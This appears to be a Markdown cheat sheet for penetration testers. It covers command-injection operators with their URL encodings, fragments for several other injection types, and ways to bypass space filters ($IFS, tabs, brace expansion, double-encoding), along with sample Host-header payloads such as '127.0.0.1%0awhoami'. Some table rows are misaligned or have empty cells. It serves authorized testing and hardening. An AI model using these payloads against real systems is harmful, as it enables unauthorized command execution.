
### Basic Command Injection Methods

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                             |                                      |                                |
| ------------------ | ------------------- | --------------------- | -------------------------------------------- | ------------------------------------ | ------------------------------ |
| Semicolon          | `;`                 | `%3b`                 | `Both`                                       |                                      |                                |
| New Line           | `\n`                | `%0a`                 | `Both`                                       |                                      |                                |
| Background         | `&`                 | `%26`                 | `Both (second output generally shown first)` |                                      |                                |
| Pipe          |     `\|`                                       | `%7c`                                        | `Both (only second output is shown)` |                                |
| AND                | `&&`                | `%26%26`              | `Both (only if first succeeds)`              |                                      |                                |
| OR                |                   `\|\|`                       |                                             | `%7c%7c`                             | `Second (only if first fails)` |
| Sub-Shell          | <code>``</code>     | `%60%60`              | `Both` *(Linux-only)*                        |                                      |                                |
| Sub-Shell          | `` `$()` ``         | `%24%28%29`           | `Both` *(Linux-only)*                        |                                      |                                |

---


```markdown
| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | `Both` |
| New Line | `\n` | `%0a` | `Both` |
| Background | `&` | `%26` | `Both (second output generally shown first)` |
| Pipe | `|` | `%7c` | `Both (only second output is shown)` |
| AND | `&&` | `%26%26` | `Both (only if first succeeds)` |
| OR | `||` | `%7c%7c` | `Second (only if first fails)` |
| Sub-Shell | <code>&#96;&#96;</code> | `%60%60` | `Both` *(Linux-only)* |
| Sub-Shell | `` `$()` `` | `%24%28%29` | `Both` *(Linux-only)* |
```

# Injection Operators — Quick Reference

Below is a compact Markdown table of common operators/payload fragments used in various injection classes (SQL, LDAP, XSS, SSRF, XXE, etc.). Use this as a reference when testing or hardening input-handling.

> **Warning:** These strings can be dangerous when executed in vulnerable systems — use only in authorized testing environments.

| Injection Type                            | Common Operators / Fragments                             |    |
| ----------------------------------------- | -------------------------------------------------------- | -- |
| SQL Injection                             | `'`, `;`, `--`, `/* */`                                  |    |
| Command Injection                         | `;`, `&&`                                                |    |
| LDAP Injection                            | `*`, `(`, `)`, `&`, ``                                   | `` |
| XPath Injection                           | `'`, `or`, `and`, `not`, `substring`, `concat`, `count`  |    |
| OS Command Injection                      | `;`, `&`, ``                                             | `` |
| Code Injection                            | `'`, `;`, `--`, `/* */`, `$()`, `${}`, `#{}`, `%{}`, `^` |    |
| Directory Traversal / File Path Traversal | `../`, `..\\`, `%00`                                     |    |
| Object Injection                          | `;`, `&`, ``                                             | `` |
| XQuery Injection                          | `'`, `;`, `--`, `/* */`                                  |    |
| Shellcode Injection                       | `\x`, `\u`, `%u`, `%n`                                   |    |
| Header Injection                          | `\n`, `\r\n`, `\t`, `%0d`, `%0a`, `%09`                  |    |


# Bypassing Space Filters — Notes & Examples

> Quick MD reference showing common ways attackers replace or bypass space characters in inputs (useful for command-injection testing). **Only use these techniques in authorized tests**.

---

## Concept

When spaces are blacklisted (e.g., an input should be an IP address), attackers replace spaces with other characters or constructs that the shell (or interpreter) will treat as separators. Common approaches: percent-encoding, control characters, environment variables, shell expansion, and alternate whitespace characters (tabs, newlines).

---

## Common bypasses (with examples)

| Bypass                             |      Example payload (URL encoded where relevant) | Why it works                                                                                        |
| ---------------------------------- | ------------------------------------------------: | --------------------------------------------------------------------------------------------------- |
| Newline (as injection operator)    |                              `127.0.0.1%0awhoami` | `\n` can terminate headers / inject new command lines; often not filtered.                          |
| Tab instead of space               | `127.0.0.1%0a%09whoami` or `127.0.0.1%0a\twhoami` | Shells accept tabs as argument separators. `%09` is URL-encoded TAB.                                |
| `$IFS` environment variable        |                        `127.0.0.1%0a${IFS}whoami` | `$IFS` expands to a space (and tab/newline by default), so `${IFS}` becomes a separator at runtime. |
| Brace expansion (no literal space) |      `127.0.0.1%0a{ls,-la}` → expands to `ls -la` | Bash brace expansion creates separate arguments without using literal spaces.                       |
| Percent-encoded space variants     |                  `+` or `%20` (sometimes blocked) | `+` is decoded to a space in URL contexts; servers may normalize or block differently.              |
| Mixed encodings / double-encoding  |                    `%2520` (double-encoded `%20`) | Some filters decode only once; double-encoding can slip through naive filters.                      |
| Other whitespace Unicode           | `U+00A0` (non-breaking space) or other whitespace | Some parsers treat Unicode whitespace as separators while filters only block ASCII space.           |

---

## Example HTTP header test snippets

(assume `Host:` header vulnerable to injection)

```http
Host: 127.0.0.1%0awhoami
Host: 127.0.0.1%0a%09whoami    # newline + tab
Host: 127.0.0.1%0a${IFS}whoami # newline + $IFS
Host: 127.0.0.1%0a{ls,-la}     # newline + brace expansion
```

---

## Practical tips for testers

* Try percent-encoding (`%0a`, `%09`, `%20`) and literal control chars where the client allows.
* Test double-encoding (`%25` + code) if single decode filters exist.
* Test environment variable expansions (`$IFS`, `${IFS}`) when the target spawns a shell.
* Try shell expansions (brace expansion, process substitution) for bash-specific targets.
* Use tabs and newline characters — many filters forget them.
* Observe server behavior: "Invalid input" often indicates server-side filtering; change only one character at a time while testing.

---



